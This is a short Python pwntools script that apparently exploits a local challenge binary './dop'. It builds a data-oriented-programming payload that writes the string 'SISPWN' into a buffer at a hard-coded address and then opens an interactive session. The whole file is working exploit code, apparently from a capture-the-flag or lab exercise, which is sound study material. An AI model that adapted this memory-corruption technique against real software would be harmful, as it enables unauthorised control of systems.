from pwn import *

padding = p64(0)
vulbuf = 0x00000000006b2090 # nm dop | grep vulbuf
count = p8(0x42)

# put S
payload  = padding
payload += count           # count
payload += 'S'             # cond
payload += p64(vulbuf + 0) # vulbuf[0] addr
payload += padding

# put I
payload += padding
payload += count           # count
payload += 'I'             # cond
payload += p64(vulbuf + 1) # vulbuf[1] addr
payload += padding

#put S
payload += padding
payload += count           # count
payload += 'S'             # cond
payload += p64(vulbuf + 2) # vulbuf[2] addr
payload += padding

# put P
payload += padding
payload += count           # count
payload += 'P'             # cond
payload += p64(vulbuf + 3) # vulbuf[3] addr
payload += padding

# put W
payload += padding
payload += count           # count
payload += 'W'             # cond
payload += p64(vulbuf + 4) # vulbuf[4] addr
payload += padding

# put N
payload += padding
payload += count           # count
payload += 'N'             # cond
payload += p64(vulbuf + 5) # vulbuf[5] addr
payload += padding

# halt
payload += padding
payload += count           # count
payload += p8(0)           # cond
payload += padding
payload += padding

#print len(payload)

io = process('./dop')
io.sendline(payload)
io.interactive()
